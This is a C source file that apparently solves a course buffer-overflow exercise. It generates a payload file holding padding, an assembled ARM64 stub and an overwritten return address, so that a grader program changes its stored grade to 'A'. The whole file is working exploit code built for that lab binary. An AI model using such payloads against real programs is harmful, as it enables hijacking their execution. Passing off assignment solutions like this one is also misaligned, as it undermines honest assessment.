/*
 * createdataA.c  –  C89-compliant exploit
 *
 *  File layout generated in dataA (each box is 4 bytes):
 *  ┌───────────────────────────────────────────────────────────────────┐
 *  │ 0x420058  "Ben Zhou and Owen Clarke\0" (25 B)                    │
 *  │           71 × 0x00  (padding → total 96 B)                      │
 *  │───────────────────────────────────────────────────────────────────│
 *  │ 0x4200B8  48-byte stub (assembles below)  ← executes after RET   │
 *  │───────────────────────────────────────────────────────────────────│
 *  │ 0x4200E8  0x00000000004200B8  (overwritten saved x30)            │
 *  └───────────────────────────────────────────────────────────────────┘
 *
 *  At run-time the stub
 *      - stores 'A' into the global grade
 *      - branches to the grader’s print-grade routine
 *  The grader then prints:
 *      A is your grade.
 *      Thank you, Ben Zhou and Owen Clarke
 */

#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

/* Absolute addresses from grader’s map file */
enum {
    NAME_ADDR  = 0x420058UL,   /* start of name[ ] BSS (RWX) */
    GRADE_ADDR = 0x420044UL,   /* &grade (initially 'D')     */
    PRINT_ADDR = 0x40089cUL,   /* routine that prints grade  */
    FILLER_LEN = 96            /* bytes between name[0] and stub */
};

int main(void)
{
    /* ---------------- declarations (C89 requires them first) ---------------- */
    FILE          *f;
    const char    *name;
    size_t         nameLen;
    size_t         padLen;
    size_t         i;
    unsigned long  STUB_ADDR;
    unsigned long  pc;          /* used while assembling the stub      */
    unsigned int   instr;       /* one 32-bit instruction              */

    /* ---------------- 0. open output file ---------------- */
    f = fopen("dataA", "wb");
    if (f == NULL) {
        perror("dataA");
        return 1;
    }

    /* ---------------- 1. write printable name ------------- */
    name     = "Ben Zhou and Owen Clarke";
    nameLen  = strlen(name) + 1;        /* include terminating NUL */

    if (nameLen > FILLER_LEN) {         /* should never happen */
        fprintf(stderr, "Name string is too long for filler\n");
        fclose(f);
        return 1;
    }

    fwrite(name, 1, nameLen, f);

    /* pad with zeroes so total filler is exactly 96 bytes */
    padLen = FILLER_LEN - nameLen;
    for (i = 0; i < padLen; ++i)
        fputc('\0', f);

    /* ---------------- 2. assemble & emit 48-byte stub ------ */
    STUB_ADDR = NAME_ADDR + FILLER_LEN;   /* = 0x4200B8 */
    pc        = STUB_ADDR;

    /* 2a. ADR x0, &grade      (x0 ← pointer to grade) */
    instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2b. MOV w1, #'A'        (w1 ← ASCII 'A')        */
    instr = MiniAssembler_mov(1, 'A');
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2c. STRB w1, [x0]       (*grade = 'A')          */
    instr = MiniAssembler_strb(1, 0);     /* from w1 → [x0] */
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2d. B PRINT_ADDR        (jump to grader’s print-grade) */
    instr = MiniAssembler_b(PRINT_ADDR, pc);
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* 2e. pad stub to exactly 48 bytes with MOV w0,#0 (acts like NOP) */
    while (pc < STUB_ADDR + 48UL) {
        instr = MiniAssembler_mov(0, 0);
        fwrite(&instr, 4, 1, f);
        pc += 4;
    }

    /* ---------------- 3. smash saved return address -------- */
    fwrite(&STUB_ADDR, sizeof(STUB_ADDR), 1, f);

    /* ---------------- done --------------------------------- */
    fclose(f);
    return 0;
}
